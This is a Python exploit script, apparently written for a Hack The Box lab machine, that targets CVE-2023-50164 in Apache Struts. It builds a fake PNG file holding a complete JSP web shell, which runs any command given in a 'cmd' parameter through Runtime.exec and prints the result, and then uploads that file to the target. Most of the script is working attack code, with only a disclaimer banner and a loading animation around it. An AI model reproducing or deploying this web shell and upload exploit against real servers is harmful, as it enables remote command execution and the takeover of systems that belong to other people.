import time
import sys
import pyfiglet

from upload import Upload

class Exploit:
    def __init__(self):
        self.target = "http://strutted.htb/"
        self.upload = Upload(self.target)         
        self.data = (
            b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
            + b"<!DOCTYPE html>" 
            + b"<html lang=\"en\">" 
            + b"<head>" 
            + b"<meta charset=\"UTF-8\">" 
            + b"<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" 
            + b"<title>Document</title>" 
            + b"</head>" 
            + b"<style>" 
            + b"body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f4; }" 
            + b".wrapper { position: fixed; z-index: 99; display: flex; width: 80%; height: 90%; flex-direction: column; gap: 10px; padding: 20px; background: #ffffff; box-shadow: 0 0 10px rgba(0, 0, 0, 0.2); border-radius: 10px; }" 
            + b".form-wrapper { gap: 10px; width: 100%; }" 
            + b"input[type=\"text\"] { padding: 10px; border: 1px solid #ccc; border-radius: 5px; outline: none; }" 
            + b"input[type=\"submit\"] { padding: 10px; background-color: #5cb85c; color: white; border: none; border-radius: 5px; cursor: pointer; }" 
            + b"input[type=\"submit\"]:hover { background-color: #4cae4c; }" 
            + b"#output { display: flex; background-color: red; max-width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; background-color: #f9f9f9; overflow-y: scroll; height: 100%; }" 
            + b"</style>" 
            + b"<body>" 
            + b"<div class=\"wrapper\">" 
            + b"<h1><span>CVE-2023-50164</span> -  Pixel WebShell</h1>" 
            + b"<form method=\"GET\" class=\"form-wrapper\" action=\"\">" 
            + b"<input id=\"cmd\" type=\"text\" name=\"cmd\" placeholder=\"Ex: whoami...\">" 
            + b"<input id=\"btn-submit\" type=\"submit\" value=\"Submit\">" 
            + b"</form>" 
            + b"<div id=\"output\">" 
            + b"<pre>" 
            + b"<%@ page import=\"java.util.*,java.io.*\" %>" 
            + b"<%" 
            + b"String command = request.getParameter(\"cmd\");" 
            + b"if (command != null) {" 
            + b"try {" 
            + b"Process p = Runtime.getRuntime().exec(command);" 
            + b"p.waitFor();" 
            + b"OutputStream os = p.getOutputStream();" 
            + b"InputStream in = p.getInputStream();" 
            + b"DataInputStream dis = new DataInputStream(in);" 
            + b"String disr = dis.readLine();" 
            + b"while (disr != null) {" 
            + b"out.println(disr);" 
            + b"disr = dis.readLine();" 
            + b"}" 
            + b"} catch (IOException | InterruptedException e) {" 
            + b"out.println(\"Error executing command: \" + e.getMessage());" 
            + b"}" 
            + b"}" 
            + b"%>" 
            + b"</pre>" 
            + b"</div>" 
            + b"</div>" 
            + b"</body>" 
            + b"</html>"
        )
        pass

    def banner(self):
        banner = pyfiglet.figlet_format("StrutRupt")
        print("\033[1;34m" + banner + "\033[0m")
        print("\033[1;32m============================================================================================+\033[0m")
        print("\033[1;36mAuthor: Pixel_DefaultBR\033[0m")
        print("\033[1;33mCVE: 2023-50164\033[0m")
        print(f"\033[1;35mTarget: {self.target}\033[0m")
        print("\033[1;31mDisclaimer: This exploit is for educational and authorized security testing purposes only.\033[0m") 
        print("\033[1;31mUnauthorized use of this script against systems without permission is illegal and unethical.\033[0m")
        print("\033[1;31mAlways obtain proper authorization before conducting security testing.\033[0m")
        print("\033[1;32m============================================================================================+\033[0m")
        print("\n")
        time.sleep(2)
        pass
    
    
    def exploit(self):
        self.create_exploit("img.png", self.data)
        self.loading_animation("Uploading exploit file")
        self.upload.upload_file()


    def create_exploit(self, filename, data):
        self.loading_animation("Creating exploit file")
        with open(filename, "wb") as f:
            f.write(data)
        print(f"\n\033[1;34m + Exploit file \"{filename}\" created successfully\033[0m\n\n")


    def loading_animation(self, text: str = "loading"):
        index = 0
        while index < len(text)*2:   
            for i in range(0, len(text)*2):
                new_text = ""
                for j in range(len(text)):
                    if j == i % len(text): 
                        if i % 2 == 0:
                            new_text += "\033[1;33m" + text[j].upper() + "\033[0m"
                        else:
                            new_text += "\033[1;34m" + text[j].lower() + "\033[0m"
                    else:
                        new_text += text[j]  
               
                sys.stdout.write("\r" + new_text)
                sys.stdout.flush()
                time.sleep(0.2)  
                index += 1


if __name__ == "__main__":
    exploit = Exploit()
    exploit.banner()
    exploit.exploit()
    pass
